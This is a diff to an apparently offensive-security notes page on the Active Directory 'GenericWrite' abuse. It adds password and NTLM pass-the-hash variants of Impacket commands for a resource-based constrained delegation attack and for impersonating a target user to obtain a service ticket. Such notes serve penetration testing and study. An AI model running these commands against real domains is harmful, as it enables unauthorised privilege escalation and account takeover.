@@ -1,6 +1,5 @@
 ---
 title: "GenericWrite"
-date: 2024-7-13
 tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows", "Disabled Account"]
 ---
 
@@ -534,13 +533,25 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 #### 1. RBCD Attack
 
 ```console
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from '<USER>' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+# Password
+impacket-rbcd -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+```
+
+```console
+# NTLM
+impacket-rbcd -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write' -hashes ':<HASH>' '<DOMAIN>/<USER>'
 ```
 
 #### 2. Impersonate
 
 ```console
+# Password
 impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+```
+
+```console
+# NTLM
+impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> -hashes ':<HASH>' '<DOMAIN>/<USER>'
 ```
 
 #### 3. Import Ticket
